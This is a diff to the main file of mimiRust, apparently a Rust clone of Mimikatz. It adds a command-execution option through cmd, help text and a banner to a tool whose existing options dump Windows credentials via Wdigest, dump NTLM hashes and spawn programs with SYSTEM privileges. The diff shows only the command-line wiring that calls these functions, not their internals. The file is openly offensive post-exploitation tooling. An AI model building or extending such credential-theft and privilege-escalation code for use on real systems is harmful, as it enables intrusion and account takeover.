@@ -12,7 +12,6 @@ use utilities::Utils;
 
 use clap::Parser;
 use anyhow::Result;
-use std::io::{stdin,stdout,Write};
 
 #[derive(Parser, Debug)]
 #[clap(about, author)]
@@ -28,13 +27,17 @@ struct Args {
     /// Dumps systems NTLM hashes
     #[clap(long)]
     dump_hashes: bool,
+
+    /// Execute a shell command through the use of cmd
+    #[clap(short, long)]
+    shell: Vec<String>,
 }
 
 
 fn main() -> Result<()> {
 
     let args = Args::parse();
-    if args.spawn_path.len() == 0 && args.dump_credentials == false && args.dump_hashes == false {
+    if args.spawn_path.len() == 0 && args.shell.len() == 0 && args.dump_credentials == false && args.dump_hashes == false {
         println!("{}", banner());
         loop {
             if !Utils::is_elevated() {
@@ -56,6 +59,10 @@ fn main() -> Result<()> {
         Escalation::get_system(args.spawn_path)?;
     }
 
+    if args.shell.len() > 0 {
+        Escalation::execute_shell(args.shell)?;
+    }
+
     if args.dump_credentials {
         Wdigest::grab()?;
     }
@@ -63,6 +70,7 @@ fn main() -> Result<()> {
     if args.dump_hashes {
         Ntlm::grab()?;
     }
+
 
     Ok(())
 }
@@ -78,7 +86,11 @@ fn banner() -> String {
     ░  ░      ░ ▒ ░░  ░      ░ ▒ ░  ░▒ ░ ▒░░░▒░ ░ ░ ░ ░▒  ░ ░    ░    
     ░      ░    ▒ ░░      ░    ▒ ░  ░░   ░  ░░░ ░ ░ ░  ░  ░    ░      
            ░    ░         ░    ░     ░        ░           ░           
-                                                                      
+
+                    written in Rust by ThottySploity
+            mimiRust $ means it's running without elevated privileges
+             mimiRust # means it's running with elevated privileges
+              mimiRust @ means it's running with system privileges             
 
     ".to_string();
 }
@@ -96,8 +108,26 @@ fn handle_user_input(args: Vec<String>) -> Result<()> {
                 Escalation::get_system(args[1].clone())?;
             }
         },
+        "shell" => {
+            if args.len() >= 1 {
+                Escalation::execute_shell(args)?;
+            }
+        },
+        "exit" => {
+            println!("Bye!");
+            std::process::exit(0x100);
+        },
+        "help" | "h" | "?" => {
+            println!("
+            \rdump-credentials             Dumps systems credentials through Wdigest
+            \rdump-hashes                  Dumps systems NTLM hashes (requires SYSTEM permissions)
+            \rspawn-path <SPAWN_PATH>      Spawn program with SYSTEM permissions from location
+            \rshell <SHELL COMMAND>        Execute a shell command through cmd, returns output
+            \rexit                         Exits out of mimiRust
+            \n\n");
+        },
         _ => {
-            println!("\ndump-credentials           Dumps systems credentials through Wdigest\ndump-hashes                Dumps systems NTLM hashesn\nspawn-path <SPAWN_PATH>    Spawn program with SYSTEM permissions from location\n\n")
+            println!("Please use: help, h or ?");
         },
     };
     Ok(())
